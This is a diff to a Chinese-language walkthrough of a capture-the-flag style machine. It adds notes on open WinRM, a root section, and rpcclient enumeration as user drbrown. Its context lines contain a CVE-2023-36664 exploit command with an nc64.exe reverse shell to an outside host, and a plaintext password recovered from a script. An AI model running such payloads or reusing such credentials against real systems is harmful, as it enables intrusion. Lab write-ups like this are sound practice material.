@@ -515,6 +515,7 @@ PORT     STATE SERVICE
 6635/tcp open  mpls-udp
 8080/tcp open  http-proxy
 ```
+开启了5985,支持winrm访问
 `22,53,88,135,139,443,445,464,1801,2103,2105,2107,3389,5985,6409,6635,8080`
 
 - 8080
@@ -563,6 +564,7 @@ python3 CVE_2023_36664_exploit.py --inject --payload "nc64.exe 10.10.16.37 4444 
 ```
 反弹shell
 
+#### root
 得到初始访问
 在Document目录下有一个ghostscript.bat
 ```powershell
@@ -571,6 +573,18 @@ powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c
 > 这个命令的目的是在远程计算机上使用指定的凭据对象，在Ghostscript的安全环境下执行给定的EPS文件处理命令。请注意，这个命令中的一些路径和参数是根据具体环境和需求进行了示例设置，您可能需要根据实际情况进行修改。
 
 可以看到一个密码`chr!$br0wn`,猜测是用户`drbrown`的
+使用`rpcclient`登录  why???
+
+```bash
+rpcclient -U "drbrown" 10.10.11.241
+```
+
+列出所有用户
+`querydispinfo`
+![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240408004802.png)
+
+admin与guest开启了共享
+
 
 ### Pov
 #### user
